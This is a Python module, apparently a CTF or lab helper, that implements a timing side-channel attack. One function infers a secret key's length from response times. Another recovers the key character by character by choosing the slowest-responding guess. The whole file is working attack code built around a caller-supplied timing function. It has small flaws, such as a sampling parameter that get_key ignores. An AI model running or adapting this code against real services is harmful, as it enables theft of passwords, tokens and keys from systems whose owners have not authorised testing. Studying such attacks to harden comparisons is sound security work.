import asyncio
import time
from string import punctuation, ascii_letters, digits

async def measure_time_async(message, measure_time):
    return await asyncio.to_thread(measure_time, message)

async def get_length(measure_time, chars=punctuation + ascii_letters + digits, sample=1, selector=min, max_len=64):
    '''
    Performs a timing attack to get the length of the key, by testing messages of lengths from 0 to max_length-1.
    '''
    times = [[] for _ in range(max_len)]
    for _ in range(sample):
        tasks = []
        for l in range(max_len):
            message = chars[0] * l
            tasks.append(measure_time(message))
        results = await asyncio.gather(*tasks)
        for l in range(max_len):
            times[l].append(results[l])
    return max(range(max_len), key=lambda l: selector(times[l]))

async def get_key(measure_time, length=None, chars=punctuation + ascii_letters + digits, sample=1, selector=min, initial_key="", print_keys=False):
    '''
    Performs a timing attack to get the content of the key, by iteratively testing each character.
    '''
    if length is None:
        length = await get_length(measure_time, chars=chars, sample=sample, selector=selector, max_len=64)

    for _ in range(length - len(initial_key)):
        times = {c: [] for c in chars}
        tasks = []
        for char in chars:
            message = initial_key + char + chars[0] * (length - len(initial_key) - 1)
            tasks.append(measure_time(message))

        results = await asyncio.gather(*tasks)
        for char, response_time in zip(chars, results):
            times[char].append(response_time)

        # Now we need to select the character based on the average response time
        selected = max(times, key=lambda c: selector(times[c]))
        initial_key += selected
        if print_keys:
            print(initial_key)

    return initial_key
